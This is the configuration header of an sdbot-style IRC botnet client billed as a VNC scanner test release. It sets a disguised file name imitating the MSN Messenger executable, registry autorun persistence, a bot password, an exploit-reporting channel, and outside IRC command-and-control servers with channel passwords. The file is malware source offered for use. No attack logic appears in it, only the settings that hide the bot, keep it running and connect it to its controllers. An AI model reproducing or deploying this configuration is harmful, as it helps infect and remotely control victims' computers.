#pragma pack(1)
//Bot configuration

char password[] = "hello";
char filename[] = "msnmsgr.exe";
char prefix = '.';
const int maxaliases = 16;
const int maxlogins = 3;
char nickconst[] = "vnc[]";
char version[] = "[sdbot Vncscaner Test Release]";
char botid[] = "vncsux";
int maxrand = 6;
int nicktype = CONSTNICK;
int cryptkey = 0;
BOOL rndfilename = FALSE;
BOOL topiccmd = TRUE;
BOOL regrun = TRUE;
BOOL nickprefix = FALSE; // dont use nickprefix its fucked up!!
char *authost[] = {"*@*", "\0"};

//server #1
char server[] = "irc.diboo.net";
char serverpass[] = "";
char exploitchan[] = "#test";
int port = 6667;
char channel[] = "#test";
char chanpass[] = "test";

//server #2
char server2[] = "irc.diboo.net";
int port2 = 6667;
char channel2[] = "#test";
char chanpass2[] = "test";
